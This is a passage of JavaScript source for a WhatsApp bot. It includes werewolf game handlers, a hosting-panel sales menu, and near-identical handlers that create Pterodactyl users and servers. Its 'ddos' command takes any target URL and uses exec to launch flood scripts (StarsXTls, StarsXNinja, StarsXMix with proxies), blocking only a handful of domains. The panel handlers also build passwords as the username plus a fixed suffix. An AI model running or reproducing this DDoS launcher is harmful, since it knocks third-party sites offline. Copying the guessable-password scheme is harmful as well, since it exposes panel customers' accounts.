            return newReply("Sesi permainan belum dimulai");
        if (ww[chat].time !== "voting")
            return newReply("Sesi voting belum dimulai");
        if (playerOnRoom(sender, chat, ww) === false)
            return newReply("Kamu bukan player");
        if (dataPlayer(sender, ww).isdead === true)
            return newReply("Kamu sudah mati");
        if (!target || target.length < 1)
            return newReply("Masukan nomor player");
        if (isNaN(target)) return newReply("Gunakan hanya nomor");
        if (dataPlayer(sender, ww).isvote === true)
            return newReply("Kamu sudah melakukan voting");
        b = getPlayerById(chat, sender, parseInt(target), ww);
        if (b.db.isdead === true)
            return newReply(`Player ${target} sudah mati.`);
        if (ww[chat].player.length < parseInt(target))
            return newReply("Invalid");
        if (getPlayerById(chat, sender, parseInt(target), ww) === false)
            return newReply("Player tidak terdaftar!");
        vote(chat, parseInt(target), sender, ww);
        return newReply("✅ Vote");
    } else if (value == "exit") {
        if (!ww[chat]) return newReply("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return newReply("Kamu tidak dalam sesi permainan");
        if (ww[chat].status === true)
            return newReply("Permainan sudah dimulai, kamu tidak bisa keluar");
        let exitww = `${sender.split("@")[0]} Keluar dari permainan`
                ToxxicTechInc.sendMessage(
            m.chat, {
                text: exitww,
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: websitex,
                        mediaUrl: thumb,
                    },
                    mentionedJid: sender,
                },
            }, {
                quoted: m
            }
        );  
        playerExit(chat, sender, ww);
    } else if (value === "delete") {
        if (!ww[chat]) return newReply("Tidak ada sesi permainan");
        if (ww[chat].owner !== sender)
            return newReply(
                `Hanya @${
            ww[chat].owner.split("@")[0]
          } yang dapat menghapus sesi permainan ini`
            );
        newReply("Sesi permainan berhasil dihapus").then(() => {
            delete ww[chat];
        });
    } else if (value === "player") {
        if (!ww[chat]) return newReply("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return newReply("Kamu tidak dalam sesi permainan");
        if (ww[chat].player.length === 0)
            return newReply("Sesi permainan belum memiliki player");
        let player = [];
        let text = "\n*⌂ W E R E W O L F - G A M E*\n\nLIST PLAYER:\n";
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )} ${
          ww[chat].player[i].isdead === true
            ? `☠️ ${ww[chat].player[i].role}`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        ToxxicTechInc.sendMessage(
            m.chat, {
                text: text,
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: websitex,
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );
    } else {
    let text = `\n*⌂ W E R E W O L F - G A M E*\n\nSocial Games That Take Place In Multiple Rounds. The Players Are Tasked To Search For An Existing Villain To Be Played. Players are given time, roles, and abilities to play the game.\n\n*⌂ C O M M A N D*\n`;
        text += ` • ww create\n`;
        text += ` • ww join\n`;
        text += ` • ww start\n`;
        text += ` • ww exit\n`;
        text += ` • ww delete\n`;
        text += ` • ww player\n`;
        text += `\ nThe game can be played by 5 to 15 people.`;
        ToxxicTechInc.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: websitex,
                        mediaUrl: thumb,
                    },
                },
            }, {
                quoted: m
            }
        );
    }
}
break
case 'ddos': {
  if (args.length < 3) return newReply('\`\`\`[🔎] .ddos [url] [duration] [methods]\`\`\`');

  const blacklistedDomains = ['google.com', 'tesla.com', 'fbi.gov', 'youtube.com', 'lahelu.com'];

  if (blacklistedDomains.some(domain => args[0].includes(domain))) {
    return newReply(m.chat, '❌ Blacklisted Target.', m);
  }
  const target = args[0]
  const duration = args[1]
  const methods = args[2]
  const details = `│ Creator: Queen Rias
│ Target: ${target}
│ Methods: ${methods}
│ Duration: ${duration}
│ Check-Host: Click Thumbnail`
  
if ( methods === 'tls' ) {
ToxxicTechInc.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: `https://telegra.ph/file/aa15d66762da2caca8d5f.png`,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./File/ddos/StarsXTls.js ${target} ${duration} 100 10`)
} else if ( methods === 'ninja' ) {     
ToxxicTechInc.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: `https://telegra.ph/file/aa15d66762da2caca8d5f.png`,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./File/ddos/StarsXNinja.js ${target} ${duration}`)
} else if ( methods === 'mix' ) {     
ToxxicTechInc.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${target}`,
body: `Check-Host Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: `https://telegra.ph/file/aa15d66762da2caca8d5f.png`,
sourceUrl: `https://check-host.net/check-http?host=${target}`
}}, text: details}, {quoted: m})
	exec(`node ./File/ddos/StarsXMix.js ${target} ${duration} 100 10 proxy.txt`)
} else {
	newReply(`_*Unknown Methods*_`)
}
  }
break
case 'panel': {
ToxxicTechInc.sendMessage(from, { react: { text: "🫡", key: m.key } })
if (isGroup) return newReply("*Only private chat*")
await ToxxicTechInc.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})  
let img1 = "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg"
let img2 = "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg"
let img3 = "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
image: {
url
}}, {
upload: ToxxicTechInc.waUploadToServer
})
return imageMessage
}
let msg = generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: (`*Hello ${pushname} ${xtime}*\n*PLEASE SELECT THE RAM PANEL YOU WANT TO CREATE*`)  },
carouselMessage: {
cards: [
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*PANEL PETRODACTYL*
❖━━━━━━━━━━━━━━━━━━━━❖
📦 </> PAKET [ 1 ] </>

> *RAM :* 5050 / 5 GB
> *DISK :* 5050 / 5 GB
> *CPU :* 150%
> *PRICE :* Rp. 2.000
> *DURATION :* 15 DAY
❖━━━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"📦 PAKET 1 RAM 5 GB\",\"id\":\".pesan-panel ${owner} PAKET 1 RAM 5 GB\"}`
},{
name: "cta_url",
 buttonParamsJson: `{"display_text":" 𝖢𝖧𝖠𝖳 𝖮𝖶𝖭𝖤𝖱","url":"https://wa.me/${owner}","merchant_url":"https://www.google.com"}`,
},
],},},
{
header: {
imageMessage: await image(img2),
hasMediaAttachment: true,
},
body: { text: `*PANEL PETRODACTYL*
❖━━━━━━━━━━━━━━━━━━━━❖
📦 </> PAKET [ 2 ] </>

> *RAM :* 6050 / 6 GB
> *DISK :* 6050 / 6 GB
> *CPU :* 180%
> *PRICE :* Rp. 3.000
> *DURATION :* 15 DAY
❖━━━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"📦 PAKET 2 RAM 6 GB\",\"id\":\".pesan-panel ${owner} PAKET 2 RAM 6 GB\"}`
},{
name: "cta_url",
 buttonParamsJson: `{"display_text":" 𝖢𝖧𝖠𝖳 𝖮𝖶𝖭𝖤𝖱","url":"https://wa.me/${owner}","merchant_url":"https://www.google.com"}`,
},
],},},
{
header: {
imageMessage: await image(img3),
hasMediaAttachment: true,
},
body: { text: `*PANEL PETRODACTYL*
❖━━━━━━━━━━━━━━━━━━━━❖
📦 </> PAKET [ 3 ] </>

> *RAM :* 7050 / 7 GB
> *DISK :* 7050 / 7 GB
> *CPU :* 210%
> *PRICE :* Rp. 4.000
> *DURATION :* 15 DAY
❖━━━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"📦 PAKET 3 RAM 7 GB\",\"id\":\".pesan-panel ${owner} PAKET 3 RAM 7 GB\"}`
},{
name: "cta_url",
 buttonParamsJson: `{"display_text":" 𝖢𝖧𝖠𝖳 𝖮𝖶𝖭𝖤𝖱","url":"https://wa.me/${owner}","merchant_url":"https://www.google.com"}`,
},
],},},
{
header: {
imageMessage: await image(img3),
hasMediaAttachment: true,
},
body: { text: `*PANEL PETRODACTYL*
❖━━━━━━━━━━━━━━━━━━━━❖
📦 </> PAKET [ 4 ] </>

> *RAM :* 8100 / 8 GB
> *DISK :* 8100 / 8 GB
> *CPU :* 240%
> *PRICE :* Rp. 5.000
> *DURATION :* 15 DAY
❖━━━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"📦 PAKET 4 RAM 8 GB\",\"id\":\".pesan-panel ${owner} PAKET 4 RAM 8 GB\"}`
},{
name: "cta_url",
 buttonParamsJson: `{"display_text":" 𝖢𝖧𝖠𝖳 𝖮𝖶𝖭𝖤𝖱","url":"https://wa.me/${owner}","merchant_url":"https://www.google.com"}`,
},
],},},
{
header: {
imageMessage: await image(img3),
hasMediaAttachment: true,
},
body: { text: `*PANEL PETRODACTYL*
❖━━━━━━━━━━━━━━━━━━━━❖
📦 </> PAKET [ 5 ] </>

> *RAM :* 9100 / 9 GB
> *DISK :* 9100 / 9 GB
> *CPU :* 270%
> *PRICE :* 6.000
> *DURATION :* 15 DAY
❖━━━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"📦 PAKET 5 RAM 9 GB\",\"id\":\".pesan-panel ${owner} PAKET 5 RAM 9 GB\"}`
},{
name: "cta_url",
 buttonParamsJson: `{"display_text":" 𝖢𝖧𝖠𝖳 𝖮𝖶𝖭𝖤𝖱","url":"https://wa.me/${owner}","merchant_url":"https://www.google.com"}`,
},
],},},
{
header: {
imageMessage: await image(img3),
hasMediaAttachment: true,
},
body: { text: `*PANEL PETRODACTYL*
❖━━━━━━━━━━━━━━━━━━━━❖
📦 </> PAKET [ 6 ] </>

> *RAM :* 10100 / 10 GB
> *DISK :* 10100 / 10 GB
> *CPU :* 300%
> *PRICE :* 7.000
> *DURATION :* 15 DAY
❖━━━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"📦PAKET 5 RAM 10 GB\",\"id\":\".pesan-panel ${owner} PAKET 5 RAM 10 GB\"}`
},{
name: "cta_url",
 buttonParamsJson: `{"display_text":" 𝖢𝖧𝖠𝖳 𝖮𝖶𝖭𝖤𝖱","url":"https://wa.me/${owner}","merchant_url":"https://www.google.com"}`,
},
],},},
{
header: {
imageMessage: await image(img3),
hasMediaAttachment: true,
},
body: { text: `*PANEL PETRODACTYL*
❖━━━━━━━━━━━━━━━━━━━━❖
📦 </> PAKET [ 7 ] </>

> *RAM :* 0 / UNLIMITED 
> *DISK :* 0 / UNLIMITED 
> *CPU :* 0% / UNLIMITED
> *PRICE :* 8.000
> *DURATION :* 15 DAY
❖━━━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"📦 PAKET 5 UNLIMITED\",\"id\":\".pesan-panel ${owner} PAKET 5 UNLIMITED\"}`
},{
name: "cta_url",
 buttonParamsJson: `{"display_text":" 𝖢𝖧𝖠𝖳 𝖮𝖶𝖭𝖤𝖱","url":"https://wa.me/${owner}","merchant_url":"https://www.google.com"}`,
},
],},},
{
header: {
imageMessage: await image(img3),
hasMediaAttachment: true,
},
body: { text: `*PANEL PETRODACTYL*
❖━━━━━━━━━━━━━━━━━━━━❖
📦 </> PAKET [ 8 ] </>

> *RESELLER PANEL*
> *CREAT RAM 1 - 10 & UNLI*
> *ADMIN PANEL*
> *CREAT RAM BEBAS*
> *DURATION :* 15 DAY*
❖━━━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"📦 PAKET 8 RAM RESELLER\",\"id\":\".pesan-panel ${owner} PAKET 8 RESELLER\"}`
},{
 "name": "quick_reply",
 "buttonParamsJson": `{\"display_text\":\"📦 PAKET 8 RAM ADMIN\",\"id\":\".pesan-panel ${owner} PAKET 8 ADMIN\"}`
},
],},},
],
messageVersion: 1,
},},},},},{});
await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id,
});}
break
case 'cp1gb': 
case '1gb': 
case 'panel1gb': {
if (!isPremium && !isCreator) return replyprem(mess.prem)
let t = text.split(',');
if (t.length < 2) return newReply(`Example : ${prefix+command} username,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender: t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net': m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "1050"
let cpu = "30"
let disk = "1050"
let email = username + "@gmail.com"
let password = username + "72bdd9"
if (!u) return
let d = (await ToxxicTechInc.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${xdate}${xtime} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
newReply(`_Creating a Server for ${pushname}_`)
let ctf = `
*Hi @${u.split`@`[0]} Here's Your Panel Data*
*FROM @${m?.sender.split('@')[0]}* `+readmore+`
┏━ ⬣『 *ACCOUNT DATA*』⬣ ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
*CPU :*${cpu}%
┃ *Created :* ${pushname}
Day :* ${xdate}
┃ *Hour :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *CAN CHANGE SC*
- *BOT CAN BE ON 24 HOURS*
- *WEB CLOSE BOT ON*
- *DO NOT WASTE QUOTA*
- *DOES NOT CONSUME HP RAM*
- 15 DAY WARRANTY*

*NOTES:*
- *TAKE GOOD CARE OF YOUR PANEL DATA*
- *OWN ONLY SEND 1X DATA*
- *ENTER GROUP FOR INFO*
- *SS PANEL WITH CP .DONE*
- *HUB ONW IF THERE ARE PROBLEMS*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SPREAD DOMAIN*

*RELATED? DELETED NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b355e4b093846225b74ad.jpg" } }, { upload: ToxxicTechInc.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+By+Toxxic+Boy","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363336528578108@newsletter',
newsletterName: ownername,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await ToxxicTechInc.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`
*Success create panel ✅*`+readmore+`
┏━  ⬣『 *ACCOUNT DATA*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${xdate}
┃ *O'clock :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username and Password Have Been Sent
To @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp2gb': 
case '2gb': 
case 'panel2gb': {
if (!isPremium && !isCreator) return replyprem(mess.prem)
let t = text.split(',');
if (t.length < 2) return newReply(`Example : ${prefix+command} username,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender: t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net': m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "2050"
let cpu = "60"
let disk = "2050"
let email = username + "@gmail.com"
let password = username + "7nd99"
if (!u) return
let d = (await ToxxicTechInc.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${xdate}${xtime} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
newReply(`_Creating a Server for ${pushname}_`)
let ctf = `
*Hi @${u.split`@`[0]} Here's Your Panel Data*
*FROM @${m?.sender.split('@')[0]}* `+readmore+`
┏━ ⬣『 *ACCOUNT DATA*』⬣ ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
*CPU :*${cpu}%
┃ *Created :* ${pushname}
Day :* ${xdate}
┃ *Hour :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *CAN CHANGE SC*
- *BOT CAN BE ON 24 HOURS*
- *WEB CLOSE BOT ON*
- *DO NOT WASTE QUOTA*
- *DOES NOT CONSUME HP RAM*
- 15 DAY WARRANTY*

*NOTES:*
- *TAKE GOOD CARE OF YOUR PANEL DATA*
- *OWN ONLY SEND 1X DATA*
- *ENTER GROUP FOR INFO*
- *SS PANEL WITH CP .DONE*
- *HUB ONW IF THERE ARE PROBLEMS*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SPREAD DOMAIN*

*RELATED? DELETED NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b355e4b093846225b74ad.jpg" } }, { upload: ToxxicTechInc.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+By+Toxxic+Boy","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363336528578108@newsletter',
newsletterName: ownername,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await ToxxicTechInc.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`
*Success create panel ✅*`+readmore+`
┏━  ⬣『 *ACCOUNT DATA*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${xdate}
┃ *O'clock :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username and Password Have Been Sent
To @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp3gb': 
case '3gb':
case 'panel3gb': {
if (!isPremium && !isCreator) return replyprem(mess.prem)
let t = text.split(',');
if (t.length < 2) return newReply(`Example : ${prefix+command} username,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender: t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net': m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "3050"
let cpu = "90"
let disk = "3050"
let email = username + "@gmail.com"
let password = username + "38d8e"
if (!u) return
let d = (await ToxxicTechInc.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${xdate}${xtime} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
newReply(`_Creating a Server for ${pushname}_`)
let ctf = `
*Hi @${u.split`@`[0]} Here's Your Panel Data*
*FROM @${m?.sender.split('@')[0]}* `+readmore+`
┏━ ⬣『 *ACCOUNT DATA*』⬣ ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
*CPU :*${cpu}%
┃ *Created :* ${pushname}
Day :* ${xdate}
┃ *Hour :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *CAN CHANGE SC*
- *BOT CAN BE ON 24 HOURS*
- *WEB CLOSE BOT ON*
- *DO NOT WASTE QUOTA*
- *DOES NOT CONSUME HP RAM*
- 15 DAY WARRANTY*

*NOTES:*
- *TAKE GOOD CARE OF YOUR PANEL DATA*
- *OWN ONLY SEND 1X DATA*
- *ENTER GROUP FOR INFO*
- *SS PANEL WITH CP .DONE*
- *HUB ONW IF THERE ARE PROBLEMS*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SPREAD DOMAIN*

*RELATED? DELETED NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b355e4b093846225b74ad.jpg" } }, { upload: ToxxicTechInc.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+By+Toxxic+Boy","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363336528578108@newsletter',
newsletterName: ownername,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await ToxxicTechInc.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
